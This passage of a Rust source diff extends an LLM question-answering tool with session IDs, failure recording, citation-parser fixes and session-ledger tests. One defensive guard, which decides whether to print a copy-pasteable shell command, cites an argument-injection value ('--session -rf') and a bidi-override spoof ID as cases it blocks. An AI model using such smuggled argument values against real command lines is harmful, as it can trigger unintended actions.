+                        >= budget_policy.compact_trigger(),
+                    "raw_total": built.budget.raw_total,
+                    "adjusted_total": built.budget.adjusted_total,
+                    "max_context_tokens": built.budget.max_context_tokens,
+                    "trigger": budget_policy.compact_trigger(),
+                    "reserve": budget_policy.compact_reserve(),
+                },
+            })
+            .to_string(),
+            created_at: now(),
         },
     )?;
 
     // 9. call the LLM once (one exchange; a permitted retry is not a second
     // turn — reference.md, "LLM turn"). `llm.started` precedes the send.
     let turn_id = crate::stamp_id("turn");
-    let request_hash = sha256_hex(&built.request_bytes());
+    // §L6 (I4-F1): this column records the **context stream** hash —
+    // `request_bytes()`, model-free and append-stable across the session —
+    // not the provider exchange's; the expand path records
+    // `LlmRequest::request_hash` (model included). `architecture.md`'s
+    // "endpoint + request_hash" cache key must not be read as satisfiable by
+    // this column alone on this path until caching lands. The model-free
+    // semantics are pinned by `ask_e2e`'s cross-model equality check.
+    let request_hash = momotaro_ingest::sha256_of(&built.request_bytes());
     store.append_run_event(
         run_id,
         &momotaro_store::NewRunEvent {
             event_type: run_event::LLM_STARTED.to_owned(),
             data_json: serde_json::json!({ "turn_id": turn_id, "model": model }).to_string(),
-            created_at: now,
+            created_at: now(),
         },
     )?;
     let request = LlmRequest {
@@ -804,8 +1255,8 @@ fn run_steps<T: ProviderTransport + ?Sized>(
         slot: Some(ANSWER_SLOT.as_str().to_owned()),
         reasoning_tokens: None,
         raw_ref: None,
-        created_at: now,
-        finished_at: Some(now),
+        created_at: now(),
+        finished_at: None,
     };
     let output = match complete(transport, &request) {
         Ok(output) => {
@@ -816,49 +1267,28 @@ fn run_steps<T: ProviderTransport + ?Sized>(
             turn.billable_tokens = output.usage.billable_tokens.and_then(to_i64);
             turn.reasoning_tokens = output.usage.reasoning_tokens.and_then(to_i64);
             turn.raw_ref = output.raw_ref.clone();
+            turn.finished_at = Some(now());
             let data = serde_json::json!({
                 "billable_tokens": output.usage.billable_tokens,
                 "cached_tokens": output.usage.cached_tokens,
                 "finish_reason": output.finish_reason.as_str(),
+                "slot": ANSWER_SLOT.as_str(),
                 "turn_id": turn_id,
             });
-            store.commit_run_llm_turn(
-                run_id,
-                &turn,
-                &momotaro_store::NewRunEvent {
-                    event_type: run_event::LLM_FINISHED.to_owned(),
-                    data_json: data.to_string(),
-                    created_at: now,
-                },
-            )?;
+            commit_llm_finished(store, run_id, &turn, data.to_string(), now())?;
             output
         }
         Err(error) => {
             turn.status = "failed".to_owned();
-            let (attribution, retryable) = failure_row(error.kind.category());
-            let data = serde_json::json!({
-                "turn_id": turn_id,
-                "error": {
-                    "attribution": attribution,
-                    "category": error.kind.category(),
-                    "retryable": retryable,
-                    "severity": momotaro_contracts::Severity::Error.as_str(),
-                },
-            });
-            store.commit_run_llm_turn(
-                run_id,
-                &turn,
-                &momotaro_store::NewRunEvent {
-                    event_type: run_event::LLM_FINISHED.to_owned(),
-                    data_json: data.to_string(),
-                    created_at: now,
-                },
-            )?;
-            return Ok(FlowOutcome::aborted(AskFailure::Provider(error.kind)));
+            turn.finished_at = Some(now());
+            record_failure_usage(&mut turn, &error);
+            let data = llm_finished_failure_payload(&turn_id, &error);
+            commit_llm_finished(store, run_id, &turn, data, now())?;
+            return Ok(Some(AskFailure::Provider(error.kind)));
         }
     };
     if output.text.trim().is_empty() {
-        return Ok(FlowOutcome::aborted(AskFailure::EmptyBody));
+        return Ok(Some(AskFailure::EmptyBody));
     }
 
     // 11. validate citations: parse the protocol, resolve the five-tuples
@@ -904,7 +1334,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
                 "detail": verification.detail.map(|detail| detail.as_str()),
             })
             .to_string(),
-            created_at: now,
+            created_at: now(),
         });
     }
     let distinct = distinct_revisions(&citations);
@@ -921,7 +1351,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
                 "detail": verification.detail.map(|detail| detail.as_str()),
             })
             .to_string(),
-            created_at: now,
+            created_at: now(),
         });
     }
     store.commit_run_verifications(
@@ -940,7 +1370,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
                     .count(),
             })
             .to_string(),
-            created_at: now,
+            created_at: now(),
         },
     )?;
 
@@ -953,7 +1383,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
         run_id: run_id.to_owned(),
         text: output.text.clone(),
         prompt_hash: request_hash.clone(),
-        created_at: now,
+        created_at: now(),
         decision_rationale: None,
         assumptions: None,
         supersedes: None,
@@ -979,7 +1409,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
     let history = vec![
         HistoryItemRecord {
             history_id: crate::stamp_id("hist"),
-            session_id: None,
+            session_id: Some(session_id.to_owned()),
             run_id: run_id.to_owned(),
             seq: 1,
             kind: "turn".to_owned(),
@@ -992,12 +1422,12 @@ fn run_steps<T: ProviderTransport + ?Sized>(
             .to_string(),
             source_ref_json: None,
             token_estimate: i64::from(estimate_tokens(built.final_user_body())),
-            created_at: now,
-            occurred_at: Some(now),
+            created_at: now(),
+            occurred_at: Some(now()),
         },
         HistoryItemRecord {
             history_id: crate::stamp_id("hist"),
-            session_id: None,
+            session_id: Some(session_id.to_owned()),
             run_id: run_id.to_owned(),
             seq: 2,
             kind: "turn".to_owned(),
@@ -1014,8 +1444,8 @@ fn run_steps<T: ProviderTransport + ?Sized>(
             .to_string(),
             source_ref_json: None,
             token_estimate: i64::from(estimate_tokens(&output.text)),
-            created_at: now,
-            occurred_at: Some(now),
+            created_at: now(),
+            occurred_at: Some(now()),
         },
     ];
     store.commit_run_answer(
@@ -1030,7 +1460,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
                 "fully_verified": verdict.fully_verified(),
             })
             .to_string(),
-            created_at: now,
+            created_at: now(),
         },
     )?;
 
@@ -1042,9 +1472,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
         .iter()
         .filter(|verification| verification.status != VerificationStatus::Passed)
         .count();
-    Ok(FlowOutcome {
-        failure: (failed > 0).then_some(AskFailure::Citations(failed, verdict.citations.len())),
-    })
+    Ok((failed > 0).then_some(AskFailure::Citations(failed, verdict.citations.len())))
 }
 
 /// The distinct `(source_key, revision_hash)` pairs the citations name, in
@@ -1145,6 +1573,11 @@ pub fn format_ask(report: &AskReport) -> String {
         crate::sanitize(&report.run_id),
         report.status
     ));
+    // The session id is the only handle on the next turn, so it sits in the
+    // header the user reads first (`usage.md` 多轮会话).
+    if let Some(session_id) = &report.session_id {
+        out.push_str(&format!("session {}\n", crate::sanitize(session_id)));
+    }
     out.push_str(&format!("query: {}\n", crate::sanitize(&report.query)));
     match &report.answer_text {
         Some(text) => {
@@ -1198,7 +1631,69 @@ pub fn format_ask(report: &AskReport) -> String {
     if let Some(note) = &report.failure_note {
         out.push_str(&format!("failure: {}\n", crate::sanitize(note)));
     }
+    // A copy-pasteable next turn. Printing the bare id would be useless on
+    // its own — the whole reason to print it is the next call. Why the line
+    // is guarded rather than quoted lives on [`is_session_id_shaped`], which
+    // is where the decision is made.
+    //
+    // The guard reads the **raw** id: `sanitize` rewrites whitespace to a
+    // space and drops the unprintable set, so `abc\u{202e}def` sanitizes down
+    // to the shaped `abcdef` and would print a command for a session that
+    // does not exist. For an id that
+    // passes the guard, `sanitize` is the identity — there is nothing in the
+    // charset for it to change — so the two are the same string.
+    if let Some(session_id) = &report.session_id
+        && is_session_id_shaped(session_id)
+    {
+        // `sanitize` is the identity here — the guard has already pinned
+        // the id to a charset it passes through — but `format_ask` promises
+        // every string is sanitized on the way to a terminal, and a promise
+        // with an exception is a promise the next change will break.
+        out.push_str(&format!(
+            "\ncontinue: momotaro ask --session {} \"…\"\n",
+            crate::sanitize(session_id)
+        ));
+    }
     out
+}
+
+/// Whether an id can be pasted into a command line **unquoted** in every
+/// shell this project's readers use (`cmd.exe`, PowerShell, POSIX).
+///
+/// Guarded rather than quoted because quoting has no portable spelling:
+/// `'…'` is a *literal* quote in `cmd.exe`, so a POSIX-quoted id arrives
+/// there as `'sess-9'` and misses the session it names — on a platform this
+/// project ships for (CI runs `windows-latest`). The charset `stamp_id` mints
+/// is the one where all three agree and none of them needs a quote.
+/// `Store::create_session` is `pub`, so this is a guard checked at the point
+/// of use rather than an assumption about where ids come from.
+fn is_session_id_shaped(id: &str) -> bool {
+    // A leading `-` is the one shape the charset alone permits and a parser
+    // reads as a flag (`--session -rf`).
+    !id.starts_with('-')
+        && !id.is_empty()
+        && id
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_'))
+}
+
+/// The one production read of `SummaryV1::tokens_before`.
+///
+/// The number is how much history the compaction replaced — without it a
+/// trace can show *that* a summary exists but not what it cost to make one,
+/// and `architecture.md` §20 called the field write-only for exactly that.
+/// Only a `summary.v1` row has one; a row whose body will not parse is a
+/// row the replay path already quarantined (`history_item` renders it
+/// [`momotaro_context::SummarySlot::Malformed`]), so the trace says so
+/// instead of printing a number it does not have.
+fn summary_tokens_before(item: &momotaro_contracts::HistoryItemRecord) -> String {
+    if item.content_kind != "summary.v1" {
+        return String::new();
+    }
+    match momotaro_context::SummaryV1::from_stored(&item.body) {
+        Ok(summary) => format!(" ({} tokens before)", summary.tokens_before),
+        Err(_) => " (summary.v1 unreadable)".to_owned(),
+    }
 }
 
 /// How one retrieved hit was treated, in the words `trace` prints.
@@ -1232,6 +1727,12 @@ pub fn format_trace(trace: &RunTrace) -> String {
         run.attempt
     ));
     out.push_str(&format!("query: {}\n", crate::sanitize(&run.query)));
+    // `--json` already carries this (`AskReport::session_id`); the human
+    // rendering has to name the conversation and the round too, or a trace
+    // cannot say which session it is a turn of.
+    if let Some(session_id) = &run.session_id {
+        out.push_str(&format!("session {}\n", crate::sanitize(session_id)));
+    }
     out.push_str(&format!(
         "spec: {} ({})\n",
         crate::sanitize(&run.run_spec_hash),
@@ -1364,10 +1865,11 @@ pub fn format_trace(trace: &RunTrace) -> String {
     }
     for item in &trace.history {
         out.push_str(&format!(
-            "  {} {} {}\n",
+            "  {} {} {}{}\n",
             item.seq,
             crate::sanitize(&item.role),
-            crate::sanitize(&item.kind)
+            crate::sanitize(&item.kind),
+            summary_tokens_before(item),
         ));
     }
 
@@ -1511,6 +2013,55 @@ Citations:
         assert_eq!(parsed[1].quoted_text, "");
     }
 
+    /// `[f` followed by multibyte text is a malformed claim, not a byte-slice
+    /// panic: byte 6 lands inside a character (`[f你好]`), and provider text
+    /// is untrusted input — the old slicer exited 101 here.
+    #[test]
+    fn a_multibyte_block_line_is_a_claim_not_a_char_boundary_panic() {
+        let parsed = parse_citations("answer\n\nCitations:\n[f你好] quoted span");
+        assert_eq!(ids(&parsed), ["[f你好] quoted span"]);
+        assert_eq!(parsed[0].quoted_text, "");
+        // ASCII lines still take the four-way path.
+        let parsed = parse_citations("answer\n\nCitations:\n[f0002] quoted span");
+        assert_eq!(ids(&parsed), ["f0002"]);
+        assert_eq!(parsed[0].quoted_text, "quoted span");
+    }
+
+    /// The two halves of the parser that nothing else could observe.
+    ///
+    /// **The inline scanner only shows when the block does not re-declare the
+    /// marker.** Every other fixture repeats each id under `Citations:`, and
+    /// the block walks a different path (`find` by id), so dropping, skipping
+    /// or re-scanning in the inline pass changes nothing the assertions can
+    /// see — an `index += 7` step became `index *= 7` and the whole suite
+    /// stayed green.
+    ///
+    /// **A block line only shows the four-way conjunction when exactly one of
+    /// the four is false.** The one malformed-line fixture has all four false,
+    /// so weakening any single `&&` still falls through to the same branch.
+    /// These two lines each fail exactly one: `[f00XY] partial` is not four
+    /// digits, `[f0002X` has no closing bracket.
+    #[test]
+    fn the_inline_scan_and_the_block_conjunction_are_each_observable() {
+        let parsed = parse_citations(
+            "a claim [f0002] then another [f0003]
+
+Citations:
+[f00XY] partial
+[f0002X
+",
+        );
+        assert_eq!(
+            ids(&parsed),
+            ["f0002", "f0003", "[f00XY] partial", "[f0002X"],
+            "both markers survive the step; both malformed lines keep the line as their id"
+        );
+        assert_eq!(
+            parsed[0].quoted_text, "",
+            "an inline marker with no block line keeps the empty quote"
+        );
+    }
+
     #[test]
     fn duplicate_markers_cite_once_and_the_first_quote_wins() {
         let parsed = parse_citations(
@@ -1614,6 +2165,7 @@ Citations:
         for (category, attribution, retryable) in [
             ("interrupted", "system", true),
             ("index_unavailable", "system", true),
+            ("store_unavailable", "system", true),
             ("retrieval_empty", "harness", false),
             ("llm_auth", "user", false),
             ("llm_rate_limit", "provider", true),
@@ -1623,7 +2175,7 @@ Citations:
             ("llm_malformed", "provider", true),
             ("citation_invalid", "harness/model", false),
         ] {
-            assert_eq!(failure_row(category), (attribution.to_owned(), retryable));
+            assert_eq!(failure_row(category), (attribution, retryable));
         }
         // Every kind the provider layer can produce maps onto its table row —
         // pinned against independent literals, one row per kind, so a
@@ -1646,20 +2198,67 @@ Citations:
             }
             assert_eq!(
                 failure_row(kind.category()),
-                (attribution.to_owned(), retryable),
+                (attribution, retryable),
                 "kind {kind:?} maps onto its section-18 row"
             );
         }
+    }
+
+    /// A turn row with nothing reported on it yet: what a failure starts from.
+    fn blank_turn() -> LlmTurnRecord {
+        LlmTurnRecord {
+            turn_id: "turn-1".to_owned(),
+            run_id: "run-1".to_owned(),
+            seq: 1,
+            provider: "provider".to_owned(),
+            model: "model".to_owned(),
+            request_hash: "hash".to_owned(),
+            status: "failed".to_owned(),
+            input_tokens: None,
+            output_tokens: None,
+            cached_tokens: None,
+            billable_tokens: None,
+            slot: Some(ANSWER_SLOT.as_str().to_owned()),
+            reasoning_tokens: None,
+            raw_ref: None,
+            created_at: 0,
+            finished_at: Some(0),
+        }
+    }
+
+    /// A failure with no usage object leaves the columns NULL — that is what
+    /// "not reported" means, and it must not be confused with the case above,
+    /// where the provider did report and the columns must carry the numbers.
+    #[test]
+    fn a_failure_with_no_usage_leaves_the_turn_silent() {
+        let error = momotaro_llm::LlmError {
+            kind: LlmErrorKind::Auth,
+            status: Some(401),
+            provider_code: None,
+            message: "the provider call for model m failed: HTTP 401".to_owned(),
+            output_observed: false,
+            attempts: 1,
+            usage: None,
+        };
+        let mut turn = blank_turn();
+        record_failure_usage(&mut turn, &error);
+        assert_eq!(turn.input_tokens, None, "{turn:?}");
+        assert_eq!(turn.output_tokens, None, "{turn:?}");
+        assert_eq!(turn.cached_tokens, None, "{turn:?}");
+        assert_eq!(turn.billable_tokens, None, "{turn:?}");
+        assert_eq!(turn.reasoning_tokens, None, "{turn:?}");
     }
 
     #[test]
     fn the_failure_payload_carries_the_four_contracted_fields() {
         assert_eq!(
             failure_data("llm_provider", "provider", true),
-            format!(
-                "{{\"attribution\":\"provider\",\"category\":\"llm_provider\",\"retryable\":true,\"severity\":\"{}\"}}",
-                momotaro_contracts::Severity::Error.as_str()
-            )
+            serde_json::json!({
+                "attribution": "provider",
+                "category": "llm_provider",
+                "retryable": true,
+                "severity": momotaro_contracts::Severity::Error.as_str(),
+            })
         );
     }
 
@@ -1692,5 +2291,929 @@ Citations:
             "no reference names no source"
         );
         assert_eq!(five_tuple_from_ref(Some("not json at all")).2, "");
+    }
+
+    // ---- W3.11: the session ledger, its round axis, and its surfaces ----
+
+    fn ledger_store() -> (tempfile::TempDir, momotaro_store::Store) {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let mut store =
+            momotaro_store::Store::open(dir.path().join("momotaro.db")).expect("open store");
+        store.init_schema().expect("init schema");
+        (dir, store)
+    }
+
+    fn ledger_event(kind: &str, at: i64) -> momotaro_store::NewRunEvent {
+        momotaro_store::NewRunEvent {
+            event_type: kind.to_owned(),
+            data_json: "{}".to_owned(),
+            created_at: at,
+        }
+    }
+
+    /// One turn run: accepted, one evidence fragment in its context, one user
+    /// turn carrying that fragment's hash into the request. That is exactly
+    /// the three inputs `SessionState` is documented as a function of.
+    fn plant_turn_run(store: &mut momotaro_store::Store, run_id: &str, at: i64, chunk: &str) {
+        store
+            .commit_run_create(
+                &momotaro_store::NewRun {
+                    run_id: run_id.to_owned(),
+                    session_id: Some("session".to_owned()),
+                    parent_run_id: None,
+                    project_id: None,
+                    attempt: 1,
+                    mode: momotaro_contracts::RunMode::Ask.as_str().to_owned(),
+                    query: "q".to_owned(),
+                    client_request_id: None,
+                    run_spec_hash: "h".to_owned(),
+                    run_spec_json: "{}".to_owned(),
+                    provider: None,
+                    model: None,
+                    context_window: None,
+                    max_output_tokens: None,
+                    created_at: at,
+                },
+                &ledger_event(momotaro_contracts::run_event::ACCEPTED, at),
+            )
+            .expect("create run");
+        store
+            .commit_run_context(
+                run_id,
+                &[
+                    momotaro_contracts::ContextItemRecord {
+                        run_id: run_id.to_owned(),
+                        ordinal: 1,
+                        fragment_id: "f0001".to_owned(),
+                        kind: "evidence".to_owned(),
+                        role: "user".to_owned(),
+                        content_kind: "text".to_owned(),
+                        body: "evidence".to_owned(),
+                        source_ref_json: Some(
+                            serde_json::json!({ "chunk_hash": chunk }).to_string(),
+                        ),
+                        token_estimate: 1,
+                        body_hash: "bh".to_owned(),
+                        decision_rationale: None,
+                        assumptions: None,
+                        supersedes: None,
+                    },
+                    // Two more fragments whose ids straddle five digits: a
+                    // lexicographic max would stop at `f9999`.
+                    momotaro_contracts::ContextItemRecord {
+                        run_id: run_id.to_owned(),
+                        ordinal: 2,
+                        fragment_id: "f9999".to_owned(),
+                        kind: "history".to_owned(),
+                        role: "user".to_owned(),
+                        content_kind: "text".to_owned(),
+                        body: "history".to_owned(),
+                        source_ref_json: None,
+                        token_estimate: 1,
+                        body_hash: "bh".to_owned(),
+                        decision_rationale: None,
+                        assumptions: None,
+                        supersedes: None,
+                    },
+                    momotaro_contracts::ContextItemRecord {
+                        run_id: run_id.to_owned(),
+                        ordinal: 3,
+                        fragment_id: "f10000".to_owned(),
+                        kind: "history".to_owned(),
+                        role: "user".to_owned(),
+                        content_kind: "text".to_owned(),
+                        body: "history".to_owned(),
+                        source_ref_json: None,
+                        token_estimate: 1,
+                        body_hash: "bh".to_owned(),
+                        decision_rationale: None,
+                        assumptions: None,
+                        supersedes: None,
+                    },
+                    // A fragment that is **not** evidence but whose
+                    // `source_ref_json` still names a chunk. Neither column
+                    // has a DDL CHECK and the two are separate vocabularies,
+                    // so the ledger must not decide on `source_ref_json`
+                    // alone: drop `item.kind == "evidence"` from the loop
+                    // above and `hash-not-evidence` lands in
+                    // `first_seen_order`, which the assertion below forbids.
+                    // Production only ever writes the ref on an evidence
+                    // fragment (`build_context`'s constructors), so this row
+                    // is the corrupt-data case the guard exists for.
+                    momotaro_contracts::ContextItemRecord {
+                        run_id: run_id.to_owned(),
+                        ordinal: 4,
+                        fragment_id: "f0002".to_owned(),
+                        kind: "question".to_owned(),
+                        role: "user".to_owned(),
+                        content_kind: "text".to_owned(),
+                        body: "question".to_owned(),
+                        source_ref_json: Some(
+                            serde_json::json!({ "chunk_hash": "hash-not-evidence" }).to_string(),
+                        ),
+                        token_estimate: 1,
+                        body_hash: "bh".to_owned(),
+                        decision_rationale: None,
+                        assumptions: None,
+                        supersedes: None,
+                    },
+                ],
+                &ledger_event(momotaro_contracts::run_event::CONTEXT_BUILT, at),
+            )
+            .expect("context");
+        store
+            .commit_run_answer(
+                run_id,
+                &momotaro_contracts::AnswerRecord {
+                    answer_id: format!("ans-{run_id}"),
+                    run_id: run_id.to_owned(),
+                    text: "answer".to_owned(),
+                    prompt_hash: "ph".to_owned(),
+                    created_at: at,
+                    decision_rationale: None,
+                    assumptions: None,
+                    supersedes: None,
+                    citations: Vec::new(),
+                },
+                &[
+                    momotaro_contracts::HistoryItemRecord {
+                        history_id: format!("hist-{run_id}"),
+                        session_id: Some("session".to_owned()),
+                        run_id: run_id.to_owned(),
+                        seq: 1,
+                        kind: "turn".to_owned(),
+                        role: "user".to_owned(),
+                        content_kind: "text".to_owned(),
+                        body: "the turn".to_owned(),
+                        payload_json: serde_json::json!({
+                            "referenced_chunk_hashes": [chunk],
+                        })
+                        .to_string(),
+                        source_ref_json: None,
+                        token_estimate: 4,
+                        created_at: at,
+                        occurred_at: Some(at),
+                    },
+                    // The assistant turn carries hashes too — but its payload
+                    // records the *citations the answer asserted*, which is not
+                    // the same fact as "this text entered the request". The
+                    // reader takes user turns only; with `&&` flipped to `||`
+                    // this row would be swallowed as well.
+                    momotaro_contracts::HistoryItemRecord {
+                        history_id: format!("hist-{run_id}-assistant"),
+                        session_id: Some("session".to_owned()),
+                        run_id: run_id.to_owned(),
+                        seq: 2,
+                        kind: "turn".to_owned(),
+                        role: "assistant".to_owned(),
+                        content_kind: "text".to_owned(),
+                        body: "the answer".to_owned(),
+                        payload_json: serde_json::json!({
+                            "referenced_chunk_hashes": ["not-a-request-hash"],
+                        })
+                        .to_string(),
+                        source_ref_json: None,
+                        token_estimate: 4,
+                        created_at: at,
+                        occurred_at: Some(at),
+                    },
+                ],
+                &ledger_event(momotaro_contracts::run_event::ANSWER_FINALIZED, at),
+            )
+            .expect("answer");
+    }
+
+    /// The ledger is a pure function of `run_context_items` + `history_items`
+    /// (`SessionState`'s doc), and every branch of that derivation is
+    /// load-bearing: the evidence filter, the user-turn filter, the numeric
+    /// fragment parse, and the round ordering that puts `run-bbb` first
+    /// because it is **older**, not because its id sorts first.
+    #[test]
+    fn the_session_ledger_is_recomputed_from_the_rows_it_is_a_function_of() {
+        let (_dir, mut store) = ledger_store();
+        // Deliberately inverted on both axes: `run-aaa` sorts first by id but
+        // is the *newer* run, so any ordering that ignores `created_at`
+        // (or ignores the round order) comes out backwards.
+        plant_turn_run(&mut store, "run-bbb", 100, "hash-b");
+        plant_turn_run(&mut store, "run-aaa", 200, "hash-a");
+
+        let turn_runs = store.turn_runs_for_session("session").expect("turns");
+        assert_eq!(
+            turn_runs,
+            vec!["run-bbb".to_owned(), "run-aaa".to_owned()],
+            "the round axis orders by (created_at, run_id), not by run_id"
+        );
+        let axes = turn_axes(&turn_runs);
+        assert_eq!(
+            axes["run-bbb"],
+            (1, 0),
+            "rounds are 1-based, positions from zero"
+        );
+        assert_eq!(axes["run-aaa"], (2, 1));
+
+        let rows = store.history_for_session("session").expect("history");
+        let ledger =
+            derive_session_state(&store, "session", &turn_runs, &rows).expect("ledger rebuilt");
+
+        assert_eq!(
+            ledger.first_seen_order,
+            vec!["hash-b".to_owned(), "hash-a".to_owned()],
+            "first appearance follows the round order the guard band uses"
+        );
+        assert_eq!(
+            ledger.injected,
+            vec!["hash-b".to_owned(), "hash-a".to_owned()],
+            "`injected` comes off the user turns' payload"
+        );
+        assert!(
+            !ledger
+                .injected
+                .iter()
+                .any(|hash| hash == "not-a-request-hash"),
+            "the assistant turn's payload is the citations it asserted, not what \
+             entered the request — `kind == \"turn\" && role == \"user\"` has to \
+             hold on both halves"
+        );
+        assert_eq!(
+            ledger.fragment_seq, 10_000,
+            "the counter parses `f10000` as ten thousand, not as text \
+             (a lexicographic max would stop at `f9999`)"
+        );
+    }
+
+    /// The hard acceptance (a), over rows the store actually holds.
+    ///
+    /// `momotaro-context`'s `prefix_stability.rs` proves `request_bytes` is
+    /// append-only, but it builds `HistoryItem` and `SessionState` by hand —
+    /// so nothing there exercises the round axis, the history row order, the
+    /// `SummarySlot` mapping or the ledger derivation this wave added, all of
+    /// which sit between the rows and the bytes. This one replays a three-turn
+    /// session the way production writes it: every turn's history body is the
+    /// previous build's `final_user_body`, its context rows are the previous
+    /// build's fragments, and each turn's ledger is re-read out of the store
+    /// instead of carried over. A store round trip that lost or reordered a
+    /// byte shows up as a prefix that stops early.
+    #[test]
+    fn a_session_round_trip_keeps_the_request_bytes_append_only() {
+        let (_dir, mut store) = ledger_store();
+
+        // Fixed across all three turns: only the session is allowed to grow.
+        // Changing the query or the evidence would move bytes for a reason
+        // this acceptance is not about.
+        let evidence = || {
+            vec![
+                momotaro_context::EvidenceItem {
+                    hit: momotaro_contracts::RetrievalHit {
+                        rank: 1,
+                        source_key: "note:a.md".to_owned(),
+                        revision_hash: "rev-a".to_owned(),
+                        chunk_id: "c1".to_owned(),
+                        chunk_hash: "h1".to_owned(),
+                        ordinal: 1,
+                        heading_path: None,
+                        score: 9.0,
+                        locator_json: "{}".to_owned(),
+                    },
+                    text: "fourier body one".to_owned(),
+                    origin_class: momotaro_contracts::OriginClass::Owner,
+                    title: Some("Fourier".to_owned()),
+                },
+                momotaro_context::EvidenceItem {
+                    hit: momotaro_contracts::RetrievalHit {
+                        rank: 2,
+                        source_key: "note:b.md".to_owned(),
+                        revision_hash: "rev-b".to_owned(),
+                        chunk_id: "c2".to_owned(),
+                        chunk_hash: "h2".to_owned(),
+                        ordinal: 1,
+                        heading_path: None,
+                        score: 5.0,
+                        locator_json: "{}".to_owned(),
+                    },
+                    text: "fft body two".to_owned(),
+                    origin_class: momotaro_contracts::OriginClass::Owner,
+                    title: None,
+                },
+            ]
+        };
+
+        let mut previous: Option<Vec<u8>> = None;
+        for turn in 1..=3i64 {
+            let run_id = format!("run-{turn}");
+
+            // Everything production reads before it builds, in production's
+            // order: the round axis, the history rows, then the ledger those
+            // two rows are a function of.
+            let turn_runs = store.turn_runs_for_session("session").expect("turns");
+            let axes = turn_axes(&turn_runs);
+            assert_eq!(
+                turn_runs.len(),
+                usize::try_from(turn - 1).unwrap_or_default(),
+                "exactly the previous turns are on the axis before turn {turn}"
+            );
+            let rows = store.history_for_session("session").expect("history");
+            let history = rows
+                .iter()
+                .map(|row| history_item(row, &axes))
+                .collect::<Result<Vec<_>, _>>()
+                .expect("history maps");
+            let session_state =
+                derive_session_state(&store, "session", &turn_runs, &rows).expect("ledger");
+
+            let built = momotaro_context::build_context(momotaro_context::ContextInput {
+                query: "what is fourier".to_owned(),
+                intent: momotaro_context::QueryIntent::Fact,
+                policy_text: POLICY_TEXT.to_owned(),
+                tool_definitions: Vec::new(),
+                instructions: INSTRUCTIONS.to_owned(),
+                history,
+                evidence: evidence(),
+                session: session_state,
+                budget: momotaro_context::BudgetPolicy::default(),
+            });
+
+            let bytes = built.request_bytes();
+            if let Some(previous) = &previous {
+                let lcp = previous
+                    .iter()
+                    .zip(&bytes)
+                    .take_while(|(left, right)| left == right)
+                    .count();
+                assert_eq!(
+                    lcp,
+                    previous.len(),
+                    "turn {}'s request bytes are a prefix of turn {turn}'s: \
+                     matched {lcp} of {}",
+                    turn - 1,
+                    previous.len()
+                );
+            }
+            previous = Some(bytes);
+
+            // Write it back the way `run_steps` does, so the next iteration
+            // reads what this one produced rather than what a fixture hopes.
+            let at = 100 + turn;
+            store
+                .commit_run_create(
+                    &momotaro_store::NewRun {
+                        run_id: run_id.clone(),
+                        session_id: Some("session".to_owned()),
+                        parent_run_id: None,
+                        project_id: None,
+                        attempt: 1,
+                        mode: momotaro_contracts::RunMode::Ask.as_str().to_owned(),
+                        query: "what is fourier".to_owned(),
+                        client_request_id: None,
+                        run_spec_hash: "h".to_owned(),
+                        run_spec_json: "{}".to_owned(),
+                        provider: None,
+                        model: None,
+                        context_window: None,
+                        max_output_tokens: None,
+                        created_at: at,
+                    },
+                    &ledger_event(momotaro_contracts::run_event::ACCEPTED, at),
+                )
+                .expect("create run");
+            let items = built
+                .fragments
+                .iter()
+                .enumerate()
+                .map(
+                    |(ordinal, fragment)| momotaro_contracts::ContextItemRecord {
+                        run_id: run_id.clone(),
+                        ordinal: i64::try_from(ordinal).unwrap_or_default(),
+                        fragment_id: fragment.fragment_id.clone(),
+                        kind: fragment.kind.as_str().to_owned(),
+                        role: fragment.role.as_str().to_owned(),
+                        content_kind: fragment.content_kind.as_str().to_owned(),
+                        body: fragment.body.clone(),
+                        source_ref_json: fragment.source_ref_json.clone(),
+                        token_estimate: i64::from(fragment.token_estimate),
+                        body_hash: momotaro_ingest::sha256_of(fragment.body.as_bytes()),
+                        decision_rationale: None,
+                        assumptions: None,
+                        supersedes: None,
+                    },
+                )
+                .collect::<Vec<_>>();
+            store
+                .commit_run_context(
+                    &run_id,
+                    &items,
+                    &ledger_event(momotaro_contracts::run_event::CONTEXT_BUILT, at),
+                )
+                .expect("context");
+            let body = built.final_user_body().to_owned();
+            let hashes = built.evidence_order().collect::<Vec<_>>();
+            store
+                .commit_run_answer(
+                    &run_id,
+                    &momotaro_contracts::AnswerRecord {
+                        answer_id: format!("ans-{run_id}"),
+                        run_id: run_id.clone(),
+                        text: format!("answer {turn}"),
+                        prompt_hash: "ph".to_owned(),
+                        created_at: at,
+                        decision_rationale: None,
+                        assumptions: None,
+                        supersedes: None,
+                        citations: Vec::new(),
+                    },
+                    &[
+                        momotaro_contracts::HistoryItemRecord {
+                            history_id: format!("hist-{run_id}-user"),
+                            session_id: Some("session".to_owned()),
+                            run_id: run_id.clone(),
+                            seq: 1,
+                            kind: "turn".to_owned(),
+                            role: "user".to_owned(),
+                            content_kind: "text".to_owned(),
+                            body,
+                            payload_json: serde_json::json!({
+                                "referenced_chunk_hashes": hashes,
+                            })
+                            .to_string(),
+                            source_ref_json: None,
+                            token_estimate: 4,
+                            created_at: at,
+                            occurred_at: Some(at),
+                        },
+                        momotaro_contracts::HistoryItemRecord {
+                            history_id: format!("hist-{run_id}-assistant"),
+                            session_id: Some("session".to_owned()),
+                            run_id: run_id.clone(),
+                            seq: 2,
+                            kind: "turn".to_owned(),
+                            role: "assistant".to_owned(),
+                            content_kind: "text".to_owned(),
+                            body: format!("answer {turn}"),
+                            payload_json: serde_json::json!({
+                                "referenced_chunk_hashes": Vec::<String>::new(),
+                            })
+                            .to_string(),
+                            source_ref_json: None,
+                            token_estimate: 4,
+                            created_at: at,
+                            occurred_at: Some(at),
+                        },
+                    ],
+                    &ledger_event(momotaro_contracts::run_event::ANSWER_FINALIZED, at),
+                )
+                .expect("answer");
+
+            // The two `SessionState` derivations have to agree. Production
+            // **discards** `built.next_session` and recomputes from these
+            // rows instead (`SessionState`'s own doc, grill Q7), so the day
+            // they came apart the recomputation would silently start the next
+            // turn from a ledger the previous build never meant — and nothing
